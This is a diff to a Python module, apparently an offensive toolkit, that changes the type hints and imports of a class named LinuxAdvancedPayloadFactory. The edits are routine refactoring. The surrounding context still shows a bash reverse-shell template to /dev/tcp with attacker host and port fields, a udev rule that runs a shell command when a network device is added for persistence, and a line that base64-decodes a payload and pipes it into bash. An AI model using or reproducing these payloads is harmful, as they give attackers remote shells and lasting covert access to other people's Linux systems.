@@ -13,12 +13,11 @@ from __future__ import annotations
 
 import base64
 import os
-import struct
 import subprocess
 import tempfile
-from dataclasses import dataclass, field
+from dataclasses import dataclass
 from pathlib import Path
-from typing import Any, Optional
+from typing import Any
 
 SESSIONS_DIR = Path(__file__).resolve().parent.parent / "sessions"
 
@@ -105,7 +104,7 @@ class LinuxAdvancedPayloadFactory:
         "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
     )
 
-    def __init__(self, config: Optional[LinuxAdvancedConfig] = None, output_dir: Optional[Path] = None):
+    def __init__(self, config: LinuxAdvancedConfig | None = None, output_dir: Path | None = None):
         self.config = config or LinuxAdvancedConfig()
         self.output_dir = Path(output_dir) if output_dir else SESSIONS_DIR / "payloads" / "linux"
         self.output_dir.mkdir(parents=True, exist_ok=True)
@@ -712,7 +711,7 @@ ACTION=="add", SUBSYSTEM=="net", RUN+="/bin/bash -c '{shell_cmd} &'"
 echo {encoded} | base64 -d | bash &
 '''
 
-    def compile_c_source(self, source: str, output_name: str, shared: bool = False) -> Optional[Path]:
+    def compile_c_source(self, source: str, output_name: str, shared: bool = False) -> Path | None:
         """Compile C source code to a binary or shared library.
 
         Args:
